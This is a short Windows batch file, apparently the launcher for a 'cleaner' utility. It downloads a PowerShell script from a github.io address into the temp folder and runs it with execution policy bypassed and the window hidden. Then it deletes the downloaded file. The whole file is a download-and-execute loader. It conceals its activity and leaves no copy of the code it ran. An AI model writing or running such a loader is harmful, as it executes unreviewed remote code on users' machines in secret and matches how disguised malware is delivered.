@echo off
chcp 65001 > nul
set "PS_FILE=%TEMP%\cleaner_ds_temp.ps1"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "[System.IO.File]::WriteAllText('%PS_FILE%', (Invoke-RestMethod -Uri 'https://cleands.github.io/cds/script.ps1'), [System.Text.Encoding]::UTF8)"

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_FILE%"

del /f /q "%PS_FILE%" > nul 2>&1
